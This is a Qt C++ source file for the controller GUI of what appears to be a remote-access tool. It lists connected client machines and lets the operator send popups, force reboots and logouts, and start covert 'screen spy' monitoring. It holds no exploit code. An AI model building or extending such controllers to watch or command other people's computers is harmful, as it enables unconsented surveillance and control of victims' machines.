#include "m_Window.h"



void m_Window::InitServer(unsigned int prot)
{
	//emit clientLogin(id, userName, ip, port, system);
	mZeroServer = new ZeroServer(this);
	connect(mZeroServer, SIGNAL(clientLogin(int, QString, QString, int, QString)), this, SLOT(addClientToTable(int, QString, QString, int, QString)));
	connect(mZeroServer, SIGNAL(clientLogout(int)), this, SLOT(removeClientFromTable(int)));
	mZeroServer->start(prot);
}

void m_Window::StopServer()
{
	mZeroServer->stop();
}


void m_Window::addClientToTable(int ID, QString Username, QString IP, int port, QString System_version)
{
	// 获取当前行数
	int rowCount = ui.tableWidget->rowCount();

	// 插入新行
	ui.tableWidget->insertRow(rowCount);

	// 添加数据到新行的各个单元格
	ui.tableWidget->setItem(rowCount, 0, new QTableWidgetItem(QString::number(ID)));  // 第1列 int 类型
	ui.tableWidget->setItem(rowCount, 1, new QTableWidgetItem(Username));  // 第2列 QString 类型
	ui.tableWidget->setItem(rowCount, 2, new QTableWidgetItem(IP));  // 第3列 QString 类型
	ui.tableWidget->setItem(rowCount, 3, new QTableWidgetItem(QString::number(port)));  // 第4列 int 类型
	ui.tableWidget->setItem(rowCount, 4, new QTableWidgetItem(System_version));  // 第5列 QString 类型
}

void m_Window::removeClientFromTable(int ID)
{
	// 获取表格中的行数
	int rowCount = ui.tableWidget->rowCount();

	// 遍历每一行，查找匹配的ID
	for (int row = 0; row < rowCount; ++row)
	{
		// 获取当前行第0列的 ID（假设 ID 存储在第0列）
		int currentID = ui.tableWidget->item(row, 0)->text().toInt();

		// 如果找到匹配的 ID，则删除该行
		if (currentID == ID)
		{
			ui.tableWidget->removeRow(row);
			break;  // 找到并删除后退出循环
		}
	}
}

void m_Window::Initialize_Interface()
{
	Set_visual_control();//初始化控件的位置
	Set_Right_click_options();//给表单结构设置右键选项
}


void m_Window::Set_Right_click_options() {
	// 启用自定义右键菜单
	ui.tableWidget->setContextMenuPolicy(Qt::CustomContextMenu);

	// 创建右键菜单
	QMenu* contextMenu = new QMenu(this); // 创建一个指向QMenu的指针，确保生命周期管理

	// 创建菜单项
	QAction* sendMessageAction = contextMenu->addAction("发送弹窗消息");
	QAction* rebootAction = contextMenu->addAction("重新开机");
	QAction* forceLogoutAction = contextMenu->addAction("强制下线");

	// 连接菜单项的信号到槽
	connect(sendMessageAction, &QAction::triggered, this, &m_Window::onTriggered);
	connect(rebootAction, &QAction::triggered, this, &m_Window::onTriggered);
	connect(forceLogoutAction, &QAction::triggered, this, &m_Window::onTriggered);

	// 连接信号和槽函数，lambda捕获contextMenu
	connect(ui.tableWidget, &QTableWidget::customContextMenuRequested,
		this, [this, contextMenu](const QPoint& pos) {
			showContextMenu(pos, contextMenu);  //传递QPoint和捕获的contextMenu
		});
}

// 修改showContextMenu函数，接收QPoint和QMenu*作为参数
void m_Window::showContextMenu(const QPoint& pos, QMenu* contextMenu) {
	m_lastClickPos = pos;

	contextMenu->popup(ui.tableWidget->viewport()->mapToGlobal(pos));
}



void m_Window::onTriggered()
{
	// 获取触发的菜单项
	QAction* action = qobject_cast<QAction*>(sender());  //sender返回发出信号的对象

	if (action)
	{
		// 根据触发的菜单项执行不同的操作
		if (action->text() == "发送弹窗消息") {
			// 弹出输入框，让用户输入内容
			bool ok;
			QString userInput = QInputDialog::getText(this, "输入消息", "请输入消息内容:", QLineEdit::Normal, "", &ok);

			// 如果用户点击了"OK"按钮
			if (ok && !userInput.isEmpty())
			{
				//mZeroServer

				// 获取右键点击的位置对应的行
				int row = ui.tableWidget->rowAt(m_lastClickPos.y());  // 根据y坐标获取行号

				// 获取ID列的内容，ID列是第0列
				QTableWidgetItem* item = ui.tableWidget->item(row, 0);  // 0是ID列的索引
				if (item)
				{
					QString id = item->text();  // 获取ID列单元格的文本内容
					int idInt = id.toInt(&ok);  // 转换为整数
					ZeroClient* client = mZeroServer->client(idInt);
					client->sendMessage(userInput);
				}
			}

		}


		else if (action->text() == "重新开机")
		{
			// 获取右键点击的位置对应的行
			int row = ui.tableWidget->rowAt(m_lastClickPos.y());  // 根据y坐标获取行号

			// 获取ID列的内容，ID列是第0列
			QTableWidgetItem* item = ui.tableWidget->item(row, 0);  // 0是ID列的索引
			if (item)
			{
				bool ok;
				QString id = item->text();  // 获取ID列单元格的文本内容
				int idInt = id.toInt(&ok);  // 转换为整数
				if (ok)
				{
					ZeroClient* client = mZeroServer->client(idInt);
					client->sendReboot();
				}
			}
		}




		else if (action->text() == "强制下线")
		{
			// 获取右键点击的位置对应的行
			int row = ui.tableWidget->rowAt(m_lastClickPos.y());  // 根据y坐标获取行号

			// 获取ID列的内容，ID列是第0列
			QTableWidgetItem* item = ui.tableWidget->item(row, 0);  // 0是ID列的索引
			if (item)
			{
				bool ok;
				QString id = item->text();  // 获取ID列单元格的文本内容
				int idInt = id.toInt(&ok);  // 转换为整数
				if (ok)
				{
					ZeroClient* client = mZeroServer->client(idInt);
					client->sendQuit();
				}
			}
		}
	}
}




void m_Window::Set_visual_control()
{
	// 设置 QLabel 的固定宽度
	ui.label->setFixedWidth(100);  // 设置 QLabel 的宽度为 100 像素
	ui.label->setAlignment(Qt::AlignCenter);  // 设置文字居中（可选）
	ui.toolBar->setFixedHeight(100);  // 将工具栏的高度设置为 50 像素


	// 设置按钮大小策略为 Expanding
	ui.pushButton->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
	ui.pushButton_2->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
	ui.pushButton_3->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
	ui.pushButton_4->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
	ui.label->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);


	// 将按钮添加到工具栏
	ui.toolBar->addWidget(ui.label);
	ui.toolBar->addWidget(ui.pushButton);
	ui.toolBar->addWidget(ui.pushButton_2);
	ui.toolBar->addWidget(ui.pushButton_3);
	ui.toolBar->addWidget(ui.pushButton_4);



	// 设置编辑框和按钮的固定大小
	ui.lineEdit->setFixedHeight(30);  // 设置 QLineEdit 高度固定为 30 像素
	ui.lineEdit->setFixedWidth(100); // 设置 QLineEdit 宽度固定为 200 像素

	ui.pushButton_5->setFixedSize(100, 30);  // 设置 QPushButton 固定大小
	ui.pushButton_6->setFixedSize(100, 30);  // 设置 QPushButton 固定大小

	// 创建一个新的布局，仅包含这三个控件
	QVBoxLayout* fixedLayout = new QVBoxLayout();

	// 将控件添加到该布局中
	fixedLayout->addWidget(ui.lineEdit);
	fixedLayout->addWidget(ui.pushButton_5);
	fixedLayout->addWidget(ui.pushButton_6);

	// 设置这三个控件的间距为固定值
	fixedLayout->setSpacing(10);  // 控件之间的垂直间距固定为 10 像素

	// 将子布局添加到 QGridLayout 中
	ui.gridLayout->addLayout(fixedLayout, 0, 0, 1, 1);

	// 设置列标题
	QStringList horizontalHeader;
	horizontalHeader << "ID" << "用户名" << "IP" << "端口" << "系统";
	ui.tableWidget->setHorizontalHeaderLabels(horizontalHeader);

	// 设置行标题
	QStringList verticalHeader;
	verticalHeader << "行1" << "行2" << "行3" << "行4";
	ui.tableWidget->setVerticalHeaderLabels(verticalHeader);

	// 设置列宽自适应并均匀分布
	ui.tableWidget->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);  // 使用 Stretch 模式
}


void m_Window::onCreateServerButtonClicked() // 按钮点击槽函数
{
	QString text = ui.lineEdit->text(); // 获取文本内容
	bool ok;                        // 转换是否成功的标志
	int value = text.toInt(&ok);    // 转换为整数

	if (ok)
	{
		InitServer(value);
	}
	else {
		qDebug() << "Input is not a valid port!";
	}
}

void m_Window::onStopServerButtonClicked() // 创建服务端按钮点击槽函数
{
	StopServer();
}


void m_Window::screenSpyClicked() // 创建服务端按钮点击槽函数
{
	bool ok;
	// 弹出输入框获取整数，初始值为0，输入范围为0到9999
	int id = QInputDialog::getInt(nullptr, "客户端 ID", "请输入已上线客户端 ID:", 0, 0, 9999, 1, &ok);


	if (id != -1) {
		ScreenSpy* ss = new ScreenSpy();
		ZeroClient* client = mZeroServer->client(id);

		if (client == nullptr)
			return;

		int port = ss->startScreenSpyServer(QString::number(id));


		// 开始监控
		client->sendScreenSpy(port);
	}
}